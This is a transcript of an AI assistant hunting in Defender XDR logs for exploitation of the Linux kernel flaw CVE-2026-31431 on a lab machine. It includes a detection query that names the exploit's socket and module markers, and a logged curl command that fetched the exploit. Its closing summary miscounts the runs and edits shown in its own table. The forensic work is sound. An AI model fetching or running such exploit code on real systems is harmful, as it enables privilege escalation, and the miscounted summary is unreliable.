Now let me hunt for actual CVE-2026-31431 exploitation patterns on your Linux machine lab-log.
⚙ defender-xdr-hunt [query=DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine contains "authencesn" or ProcessCommandLine contains "algif_aead" or ProcessCommandLine contains "AF_ALG" or ProcessCommandLine contains "copy_fail" or ProcessCommandLine has_any ("os.splice", "splice(", "AF_ALG", "algif")
| project Timestamp, DeviceName, FileName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessFileName
| order by Timestamp asc]
Thinking: Let me analyze these results. This is a clear detection of CVE-2026-31431 (Copy Fail) exploitation on the Linux machine lab-log. Let me break down what we see:
1. Kernel module loading at 19:41:05 - The kernel auto-loaded algif_aead and crypto-authencesn(hmac(sha256),cbc(aes)) - these are the exact kernel modules needed for the exploit. The modprobe -q -- algif-aead and modprobe -q -- crypto-authencesn(hmac(sha256),cbc(aes)) commands are the kernel's auto-load triggered when the exploit script opens the AF_ALG socket with socket(AF_ALG, SOCK_SEQPACKET, 0) and binds to authencesn(hmac(sha256),cbc(aes)).
2. copy_fail.py execution - Multiple runs of python3 copy_fail.py and sudo python3 copy_fail.py with editing cycles via vi copy_fail.py.
3. The curl command from earlier: curl https://copy.fail/exp to fetch the exploit (from the earlier results).
This is textbook CVE-2026-31431 activity. Let me present this clearly.
Here are the CVE-2026-31431 (Copy Fail) hunting results from lab-log:
Phase 1: Kernel module auto-load (19:41:05 UTC) — triggered by the exploit opening an AF_ALG socket:
Timestamp	AccountName	ProcessCommandLine
19:41:05.812	root	/sbin/modprobe -q -- algif-aead
19:41:05.816	root	/sbin/modprobe -q -- crypto-authencesn(hmac(sha256),cbc(aes))
19:41:05.817	root	/sbin/modprobe -q -- crypto-authencesn(hmac(sha256),cbc(aes))-all
19:41:05.819	root	/sbin/modprobe -q -- crypto-authencesn
These are the exact kernel modules the exploit loads via socket(AF_ALG, 5, 0).bind("aead", "authencesn(hmac(sha256),cbc(aes))").
Phase 2: Exploit execution + edit/run loop (20:09 — 20:30 UTC):
Timestamp	AccountName	ProcessCommandLine
20:09:11	wtadmin	sudo python3 copy_fail.py
20:09:15	wtadmin	sudo python3 copy_fail.py (chain: bash → sudo → python3)
20:09:26	wtadmin/root	sudo vi copy_fail.py → vi copy_fail.py (edit)
20:16:43	wtadmin	python3 copy_fail.py (no sudo, child fork)
20:27:10	wtadmin	sudo vi copy_fail.py (edit)
20:27:33	wtadmin	python3 copy_fail.py
20:27:47	wtadmin	python3 copy_fail.py
20:27:49	wtadmin	sudo vi copy_fail.py (edit)
20:28:08	wtadmin	python3 copy_fail.py (child fork)
20:30:10	wtadmin	sudo vi copy_fail.py (final edit)
Summary: Classic CVE-2026-31431 PoC activity — AF_ALG + authencesn modules loaded, then 8 runs of copy_fail.py with 3 edit cycles. Total window: ~49 minutes. Single source wtadmin from lab-log. The curl https://copy.fail/exp at 19:41:05 (from earlier results) fetched the PoC.
